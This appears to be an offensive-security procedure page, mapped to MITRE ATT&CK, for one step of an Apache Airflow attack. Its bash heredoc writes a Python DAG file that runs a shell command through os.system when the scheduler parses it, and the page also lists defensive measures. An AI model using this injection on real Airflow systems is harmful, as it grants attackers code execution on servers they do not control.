---
tags:
  - dag
  - python
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/write-malicious-dag]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:29:09.505Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 47b3773d-9c76-46b9-9591-77b31ee9c6ae
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Inject-Malicious-DAG-Code

## Summary

This procedure writes malicious Python code to the target DAG file using a heredoc, including an os.system call for RCE and a basic Airflow DAG import to ensure scheduler processing.

## Description

After symlink setup, the poc.py file is writable. The injected code executes 'id >>/tmp/pwned' via os.system when the DAG runs, demonstrating RCE. The 'from airflow import DAG' ensures it's recognized as a valid DAG. Target: Airflow DAGs directory. Prerequisites: Symlink complete, poc.py exists. Expected outcome: Malicious DAG ready for execution, leading to command run as Airflow user.

## Requirements

1. poc.py file created and writable from prior steps
2. $TARGET set
3. Basic Python knowledge for payload crafting

## Defense

Defensive measures and detection strategies:

- Validate DAG files with static analysis or signatures before scheduling
- Restrict write access to DAGs directory to trusted users only
- Monitor for unexpected file writes in DAGs via integrity checks (e.g., tripwire)

## Objectives

1. Deliver RCE payload within a functional DAG structure
2. Ensure code executes on scheduler parse
3. Demonstrate impact with output to /tmp/pwned

## Instructions

### Step 1: Write Malicious Code

**Context**: Uses cat with heredoc to inject Python code redirecting to poc.py.

**Command** ([[commands/write-malicious-dag]]):
```bash
(cat <<'EOF'
 import os
 os.system("id >>/tmp/pwned")
 from airflow import DAG
 EOF
 ) > $TARGET/dags/poc.py
```

> Creates file with import os, system call, and DAG import. Expected output: No output; verify content with cat.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques

- None

## Commands Used

- [[commands/write-malicious-dag]]

## Tools Used

- None

## Tags

- [[dag]]
- [[Python]]
- [[rce]]
